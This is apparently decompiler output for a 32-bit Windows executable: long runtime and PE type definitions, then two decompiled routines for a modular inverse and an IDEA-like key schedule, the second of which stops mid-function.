typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined5;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    void *pVFTable;
    void *spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

typedef int __ehstate_t;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
};

typedef struct _s__RTTIClassHierarchyDescriptor _s__RTTIClassHierarchyDescriptor, *P_s__RTTIClassHierarchyDescriptor;

typedef struct _s__RTTIBaseClassDescriptor _s__RTTIBaseClassDescriptor, *P_s__RTTIBaseClassDescriptor;

typedef struct _s__RTTIBaseClassDescriptor RTTIBaseClassDescriptor;

typedef struct PMD PMD, *PPMD;

typedef struct _s__RTTIClassHierarchyDescriptor RTTIClassHierarchyDescriptor;

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s__RTTIBaseClassDescriptor {
    struct TypeDescriptor *pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    dword numContainedBases; // count of extended classes in BaseClassArray (RTTI 2)
    struct PMD where; // member displacement structure
    dword attributes; // bit flags
    RTTIClassHierarchyDescriptor *pClassHierarchyDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3) for class
};

struct _s__RTTIClassHierarchyDescriptor {
    dword signature;
    dword attributes; // bit flags
    dword numBaseClasses; // number of base classes (i.e. rtti1Count)
    RTTIBaseClassDescriptor **pBaseClassArray; // ref to BaseClassArray (RTTI 2)
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Class Structure
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

typedef struct _s_ESTypeList _s_ESTypeList, *P_s_ESTypeList;

typedef struct _s_ESTypeList ESTypeList;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    uint nIPMapEntries;
    void *pIPToStateMap;
    ESTypeList *pESTypeList;
    int EHFlags;
};

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
};

struct _s_ESTypeList {
    int nCount;
    HandlerType *pTypeArray;
};

typedef struct _s__RTTICompleteObjectLocator _s__RTTICompleteObjectLocator, *P_s__RTTICompleteObjectLocator;

struct _s__RTTICompleteObjectLocator {
    dword signature;
    dword offset; // offset of vbtable within class
    dword cdOffset; // constructor displacement offset
    struct TypeDescriptor *pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    RTTIClassHierarchyDescriptor *pClassDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3)
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct _s_FuncInfo FuncInfo;

typedef struct _s__RTTICompleteObjectLocator RTTICompleteObjectLocator;

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Class Structure
};

typedef struct bad_alloc bad_alloc, *Pbad_alloc;

struct bad_alloc { // PlaceHolder Class Structure
};

typedef struct bad_exception bad_exception, *Pbad_exception;

struct bad_exception { // PlaceHolder Class Structure
};

typedef struct _cpinfo _cpinfo, *P_cpinfo;

typedef uint UINT;

typedef uchar BYTE;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef ulong DWORD;

typedef DWORD LCTYPE;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef ushort WORD;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _TIME_ZONE_INFORMATION _TIME_ZONE_INFORMATION, *P_TIME_ZONE_INFORMATION;

typedef long LONG;

typedef wchar_t WCHAR;

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

struct _TIME_ZONE_INFORMATION {
    LONG Bias;
    WCHAR StandardName[32];
    SYSTEMTIME StandardDate;
    LONG StandardBias;
    WCHAR DaylightName[32];
    SYSTEMTIME DaylightDate;
    LONG DaylightBias;
};

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _TIME_ZONE_INFORMATION *LPTIME_ZONE_INFORMATION;

typedef struct _PROCESS_INFORMATION *LPPROCESS_INFORMATION;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _TOKEN_PRIVILEGES _TOKEN_PRIVILEGES, *P_TOKEN_PRIVILEGES;

typedef struct _LUID_AND_ATTRIBUTES _LUID_AND_ATTRIBUTES, *P_LUID_AND_ATTRIBUTES;

typedef struct _LUID_AND_ATTRIBUTES LUID_AND_ATTRIBUTES;

typedef struct _LUID _LUID, *P_LUID;

typedef struct _LUID LUID;

struct _LUID {
    DWORD LowPart;
    LONG HighPart;
};

struct _LUID_AND_ATTRIBUTES {
    LUID Luid;
    DWORD Attributes;
};

struct _TOKEN_PRIVILEGES {
    DWORD PrivilegeCount;
    LUID_AND_ATTRIBUTES Privileges[1];
};

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef WCHAR *LPWSTR;

typedef struct _IMAGE_SECTION_HEADER *PIMAGE_SECTION_HEADER;

typedef WCHAR *PCNZWCH;

typedef WCHAR *LPWCH;

typedef WCHAR *LPCWSTR;

typedef struct _LUID *PLUID;

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef CHAR *LPCH;

typedef struct _OSVERSIONINFOA _OSVERSIONINFOA, *P_OSVERSIONINFOA;

struct _OSVERSIONINFOA {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR szCSDVersion[128];
};

typedef struct _OSVERSIONINFOA *LPOSVERSIONINFOA;

typedef struct _TOKEN_PRIVILEGES *PTOKEN_PRIVILEGES;

typedef DWORD LCID;

typedef CHAR *PCNZCH;

typedef HANDLE *PHANDLE;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef struct tm tm, *Ptm;

struct tm {
    int tm_sec;
    int tm_min;
    int tm_hour;
    int tm_mday;
    int tm_mon;
    int tm_year;
    int tm_wday;
    int tm_yday;
    int tm_isdst;
};

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef void (*_PHNDLR)(int);

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME *LPFILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef int (*FARPROC)(void);

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef WORD *LPWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef DWORD *PDWORD;

typedef BOOL *LPBOOL;

typedef BYTE *PBYTE;

typedef struct HINSTANCE__ *HINSTANCE;

typedef void *LPCVOID;

typedef HINSTANCE HMODULE;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY32 IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

struct IMAGE_LOAD_CONFIG_DIRECTORY32 {
    dword Size;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword GlobalFlagsClear;
    dword GlobalFlagsSet;
    dword CriticalSectionDefaultTimeout;
    dword DeCommitFreeBlockThreshold;
    dword DeCommitTotalFreeThreshold;
    pointer32 LockPrefixTable;
    dword MaximumAllocationSize;
    dword VirtualMemoryThreshold;
    dword ProcessHeapFlags;
    dword ProcessAffinityMask;
    word CsdVersion;
    word DependentLoadFlags;
    pointer32 EditList;
    pointer32 SecurityCookie;
    pointer32 SEHandlerTable;
    dword SEHandlerCount;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

typedef struct _iobuf FILE;

typedef LONG LSTATUS;

typedef char *va_list;

typedef uint uintptr_t;

typedef struct _tiddata _tiddata, *P_tiddata;

typedef struct _tiddata *_ptiddata;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct *pthreadmbcinfo;

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct *pthreadlocinfo;

typedef struct setloc_struct setloc_struct, *Psetloc_struct;

typedef struct setloc_struct _setloc_struct;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct lconv lconv, *Plconv;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

typedef struct _is_ctype_compatible _is_ctype_compatible, *P_is_ctype_compatible;

struct lconv {
    char *decimal_point;
    char *thousands_sep;
    char *grouping;
    char *int_curr_symbol;
    char *currency_symbol;
    char *mon_decimal_point;
    char *mon_thousands_sep;
    char *mon_grouping;
    char *positive_sign;
    char *negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t *_W_decimal_point;
    wchar_t *_W_thousands_sep;
    wchar_t *_W_int_curr_symbol;
    wchar_t *_W_currency_symbol;
    wchar_t *_W_mon_decimal_point;
    wchar_t *_W_mon_thousands_sep;
    wchar_t *_W_positive_sign;
    wchar_t *_W_negative_sign;
};

struct _is_ctype_compatible {
    ulong id;
    int is_clike;
};

struct setloc_struct {
    wchar_t *pchLanguage;
    wchar_t *pchCountry;
    int iLocState;
    int iPrimaryLen;
    BOOL bAbbrevLanguage;
    BOOL bAbbrevCountry;
    UINT _cachecp;
    wchar_t _cachein[131];
    wchar_t _cacheout[131];
    struct _is_ctype_compatible _Loc_c[5];
    wchar_t _cacheLocaleName[85];
};

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t *mblocalename;
};

struct localerefcount {
    char *locale;
    wchar_t *wlocale;
    int *refcount;
    int *wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int *lconv_intl_refcount;
    int *lconv_num_refcount;
    int *lconv_mon_refcount;
    struct lconv *lconv;
    int *ctype1_refcount;
    ushort *ctype1;
    ushort *pctype;
    uchar *pclmap;
    uchar *pcumap;
    struct __lc_time_data *lc_time_curr;
    wchar_t *locale_name[6];
};

struct _tiddata {
    ulong _tid;
    uintptr_t _thandle;
    int _terrno;
    ulong _tdoserrno;
    uint _fpds;
    ulong _holdrand;
    char *_token;
    wchar_t *_wtoken;
    uchar *_mtoken;
    char *_errmsg;
    wchar_t *_werrmsg;
    char *_namebuf0;
    wchar_t *_wnamebuf0;
    char *_namebuf1;
    wchar_t *_wnamebuf1;
    char *_asctimebuf;
    wchar_t *_wasctimebuf;
    void *_gmtimebuf;
    char *_cvtbuf;
    uchar _con_ch_buf[5];
    ushort _ch_buf_used;
    void *_initaddr;
    void *_initarg;
    void *_pxcptacttab;
    void *_tpxcptinfoptrs;
    int _tfpecode;
    pthreadmbcinfo ptmbcinfo;
    pthreadlocinfo ptlocinfo;
    int _ownlocale;
    ulong _NLG_dwCode;
    void *_terminate;
    void *_unexpected;
    void *_translator;
    void *_purecall;
    void *_curexception;
    void *_curcontext;
    int _ProcessingThrow;
    void *_curexcspec;
    void *_pFrameInfoChain;
    _setloc_struct _setloc_data;
    void *_reserved1;
    void *_reserved2;
    void *_reserved3;
    void *_reserved4;
    void *_reserved5;
    int _cxxReThrow;
    ulong __initDomain;
    int _initapartment;
};

struct __lc_time_data {
    char *wday_abbr[7];
    char *wday[7];
    char *month_abbr[12];
    char *month[12];
    char *ampm[2];
    char *ww_sdatefmt;
    char *ww_ldatefmt;
    char *ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t *_W_wday_abbr[7];
    wchar_t *_W_wday[7];
    wchar_t *_W_month_abbr[12];
    wchar_t *_W_month[12];
    wchar_t *_W_ampm[2];
    wchar_t *_W_ww_sdatefmt;
    wchar_t *_W_ww_ldatefmt;
    wchar_t *_W_ww_timefmt;
    wchar_t *_W_ww_locale_name;
};

typedef struct EHRegistrationNode EHRegistrationNode, *PEHRegistrationNode;

struct EHRegistrationNode { // PlaceHolder Structure
};

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

struct _s_CatchableType { // PlaceHolder Structure
};

typedef enum _EXCEPTION_DISPOSITION {
} _EXCEPTION_DISPOSITION;

typedef struct EHExceptionRecord EHExceptionRecord, *PEHExceptionRecord;

struct EHExceptionRecord { // PlaceHolder Structure
};

typedef struct CatchGuardRN CatchGuardRN, *PCatchGuardRN;

struct CatchGuardRN { // PlaceHolder Structure
};

typedef struct TranslatorGuardRN TranslatorGuardRN, *PTranslatorGuardRN;

struct TranslatorGuardRN { // PlaceHolder Structure
};

typedef struct _LocaleUpdate _LocaleUpdate, *P_LocaleUpdate;

struct _LocaleUpdate { // PlaceHolder Structure
};

typedef int (*_onexit_t)(void);

typedef ushort wint_t;

typedef uint size_t;

typedef int errno_t;

typedef struct localeinfo_struct localeinfo_struct, *Plocaleinfo_struct;

struct localeinfo_struct {
    pthreadlocinfo locinfo;
    pthreadmbcinfo mbcinfo;
};

typedef int intptr_t;

typedef struct localeinfo_struct *_locale_t;

typedef longlong __time64_t;

typedef size_t rsize_t;




uint FUN_00401000(void)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ushort uVar3;
  uint in_EAX;
  int iVar4;
  uint uVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  
  if (1 < (ushort)in_EAX) {
    uVar5 = in_EAX & 0xffff;
    uVar1 = 0x10001 % (ulonglong)(longlong)(int)uVar5;
    uVar6 = (uint)uVar1;
    uVar8 = (uint)(0x10001 / (ulonglong)(longlong)(int)uVar5) & 0xffff;
    if ((short)uVar1 == 1) {
      return 1 - uVar8;
    }
    iVar7 = 1;
    do {
      iVar4 = (int)((ulonglong)uVar5 / (ulonglong)(longlong)(int)uVar6) * uVar8;
      uVar3 = (ushort)((ulonglong)uVar5 % (ulonglong)(longlong)(int)uVar6);
      iVar7 = iVar7 + iVar4;
      if (uVar3 == 1) {
        return CONCAT22((short)((uint)iVar4 >> 0x10),(short)iVar7);
      }
      uVar5 = (uint)uVar3;
      uVar1 = (ulonglong)uVar6;
      uVar2 = uVar1 % (ulonglong)(longlong)(int)uVar5;
      uVar6 = (uint)uVar2;
      uVar8 = uVar8 + (int)(uVar1 / (ulonglong)(longlong)(int)uVar5) * iVar7;
    } while ((short)uVar2 != 1);
    in_EAX = 1 - uVar8;
  }
  return in_EAX;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00401080(void)

{
  short sVar1;
  int iVar2;
  byte *in_EAX;
  uint uVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  short *psVar7;
  short local_68 [4];
  short sStack_60;
  short local_5e;
  short local_5c;
  short local_5a;
  
  local_68[0] = (ushort)*in_EAX * 0x100 + (ushort)in_EAX[1];
  local_68[1] = (ushort)in_EAX[2] * 0x100 + (ushort)in_EAX[3];
  local_68[2] = (ushort)in_EAX[4] * 0x100 + (ushort)in_EAX[5];
  local_68[3] = (ushort)in_EAX[6] * 0x100 + (ushort)in_EAX[7];
  sStack_60 = (ushort)in_EAX[8] * 0x100 + (ushort)in_EAX[9];
  local_5e = (ushort)in_EAX[10] * 0x100 + (ushort)in_EAX[0xb];
  local_5c = (ushort)in_EAX[0xc] * 0x100 + (ushort)in_EAX[0xd];
  psVar7 = local_68;
  local_5a = (ushort)in_EAX[0xe] * 0x100 + (ushort)in_EAX[0xf];
  iVar5 = 0x2c;
  uVar3 = 0;
  do {
    uVar4 = uVar3 + 1 & 7;
    psVar7[uVar3 + 8] = (ushort)psVar7[uVar3 + 2 & 7] >> 7 | psVar7[uVar4] << 9;
    iVar5 = iVar5 + -1;
    psVar7 = psVar7 + (uVar3 + 1 & 8);
    uVar3 = uVar4;
  } while (iVar5 != 0);
  uVar3 = FUN_00401000();
  DAT_00419fde = (undefined2)uVar3;
  _DAT_00419fdc = -local_68[2];
  _DAT_00419fda = -local_68[1];
  uVar3 = FUN_00401000();
  DAT_00419fd8 = (undefined2)uVar3;
  iVar5 = 7;
  psVar7 = &DAT_00419fd4;
